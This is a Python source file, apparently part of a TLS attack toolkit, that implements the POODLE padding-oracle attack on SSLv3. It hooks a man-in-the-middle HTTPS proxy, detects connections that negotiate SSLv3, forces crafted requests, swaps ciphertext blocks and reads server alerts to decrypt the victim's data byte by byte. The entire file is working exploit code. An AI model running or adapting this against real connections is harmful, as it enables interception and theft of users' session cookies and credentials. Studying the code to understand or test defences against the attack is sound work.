import logging
import threading

from tls_attack.structure.TLSHeader       import *
from tls_attack.structure.TLSHandshake    import *
from tls_attack.structure.TLSServerHello  import *
from tls_attack.structure.TLSEmpty        import *
from tls_attack.module.ForceRequestOracle import *

class PoodleAttack:
    def __init__(self, https_proxy, force_request):
        self.https_proxy = https_proxy
        self.force_request = force_request
        self.attack_pool = {}
        self.is_started = False
        self.vulnerable_handler = []
    
    def on_vulnerable_connection(self, callback):
        self.vulnerable_handler.append(callback)

    def start(self):
        if not self.is_started:
            self.https_proxy.on_packet_received(self._https_handler)
            self.https_proxy.start()
            self.force_request.start()

    def decrypt_byte(self, key, byte_index, callback):
        oracle = self.attack_pool[key].force_request_oracle

        def decrypt_async():
            self._decrypt_byte(key, byte_index, callback)

        # Wait until the module is ready to start decrypting byte. When the module is ready attributes like the 
        # base length and the cipher block size are available. Since those values are needed to find the proper 
        # padding, we must wait.
        if not oracle.ready:
            oracle.on_ready(decrypt_async)
        else:
            decrypt_async()
        
    def _decrypt_byte(self, key, byte_index, callback):
        start_data = "POST / HTTP/1.1\r\n"

        attack_state = self.attack_pool[key]
        oracle = attack_state.force_request_oracle

        # Here we are calculating the length of the URL so that the byte_index we want to decrypt
        # is the last byte of a block.
        length_url = oracle.block_size - (len(start_data) + byte_index + 1) % oracle.block_size

        # We add padding so that requests for different byte position have different length
        # This way we don't have collision with echo of previous byte decryption.
        length_url += attack_state.block_padding * oracle.block_size

        # Here we are calculating the length of the POST data so that padding requires
        # block_size bytes.
        length_post_data = oracle.block_size - (oracle.base_length + length_url) % oracle.block_size
        
        # We will put that data in a c=DATA variable so we need at least 2 bytes to replace
        length_post_data += oracle.block_size
        length_post_data -= 2

        # In the header "Content-Length" will take 1 extra byte since it's going to be 
        # a 2 digits number instead of one.
        length_post_data -= 1

        self.byte_position = len(start_data) + length_url + byte_index + 1
        self.byte_block = int(self.byte_position / oracle.block_size) - 1

        def alter_application_data(connection, structure, state, source):
            # We select the block
            block_ciphered = structure.body.encrypted_data
            swap_block_start = self.byte_block * oracle.block_size
            swap_block_end = (self.byte_block + 1) * oracle.block_size
            swap_block = block_ciphered[swap_block_start : swap_block_end]

            structure.body.encrypted_data = block_ciphered[:-oracle.block_size] + swap_block

            # If this permutation doesn't yield an Alert message, we will know that the
            # byte value is the following :
            attack_state.current_guest     = oracle.block_size - 1
            attack_state.current_guest    ^= block_ciphered[swap_block_start - 1]
            attack_state.current_guest    ^= block_ciphered[-oracle.block_size - 1]

            attack_state.connection_id     = connection.id
            attack_state.current_callback  = callback
            attack_state.current_byte      = byte_index

            return structure

        def success_callback():
            # In some cases, we might not cancel timer even though an alert message
            # has been received.
            if attack_state.current_guest is None:
                return

            logging.warn("Poodle Step Success ! Found %s." % attack_state.current_guest)

            callback = attack_state.current_callback
            byte_index = attack_state.current_byte
            guess = attack_state.current_guest

            attack_state.reset()
            attack_state.next_byte()

            try:
                callback(guess, byte_index)
            except Exception as err:
                logging.error(traceback.format_exc())


        # We determine that a permutation didn't yield an Alert message by waiting a fix amount of time.
        attack_state.wait_thread = threading.Timer(3.0, success_callback)
        attack_state.wait_thread.start()

        oracle.force_request(b"/" + b"A"*length_url, b"c=" + b"A"*length_post_data, alter_application_data)

    def _start_attack(self, key, client_ip, server_ip):
        for callback in self.vulnerable_handler:
            try:
                callback(key, client_ip, server_ip)
            except Exception as err:
                logging.error(traceback.format_exc())

    def _https_handler(self, connection, structure, state, source):
        client_ip = connection.source_ip
        server_ip = connection.destination_ip
        key = "%s : %s" % (client_ip, server_ip)

        if key in self.attack_pool:
            attack_state = self.attack_pool[key]

            # Drop client request once the content was alter.
            # This helps reduce the noise on the connection.
            if source == TLSSource.CLIENT:
                if not attack_state.current_guest is None and attack_state.current_callback and attack_state.connection_id == connection.id:
                    return TLSEmpty()

            if source == TLSSource.SERVER and structure.content_type == TLSContentType.TLSAlert.value:
                attack_state.mutex.acquire()
                try:
                    if not attack_state.current_guest is None and attack_state.current_callback and attack_state.connection_id == connection.id:
                        logging.info("Poodle Step Failed ! Tried %s. Retrying ..." % attack_state.current_guest)

                        self.https_proxy.drop_connection(attack_state.connection_id)

                        callback = attack_state.current_callback
                        byte_index = attack_state.current_byte
                        attack_state.reset()

                        next_step = threading.Timer(0.1, self._decrypt_byte, (key, byte_index, callback))
                        next_step.start()
                finally:
                    attack_state.mutex.release()

        # Here we detect SSLv3 connection so that we only attempt this
        # attack on naturally negotiated SSLv3 connection.
        if type(structure.body) == TLSHandshake:
            if type(structure.body.body) == TLSServerHello:
                server_hello = structure.body.body
                
                if server_hello.version == TLSVersion.SSLv3.value:
                    if not key in self.attack_pool:
                        logging.warn("Vulnerable Poodle Connection detected on client '%s' connecting to '%s'." % (client_ip, server_ip))

                        force_request_oracle = ForceRequestOracle(self.force_request, self.https_proxy, client_ip, server_ip)
                        force_request_oracle.start()

                        self.attack_pool[key] = PoodleAttackState(client_ip, server_ip, force_request_oracle)
                        self._start_attack(key, client_ip, server_ip)

class PoodleAttackState:
    def __init__(self, client_ip, server_ip, force_request_oracle):
        self.client_ip = client_ip
        self.server_ip = server_ip
        self.force_request_oracle = force_request_oracle
        self.wait_thread = None
        self.mutex = threading.Lock()
        self.block_padding = 0

        self.reset()

    def reset(self):
        if self.wait_thread:
            self.wait_thread.cancel()

        self.connection_id = None
        self.wait_thread = None
        self.current_callback = None
        self.current_guest = None
        self.current_byte = None
        self.current_alert = 0

    def next_byte(self):
        self.block_padding = (self.block_padding + 2) % 5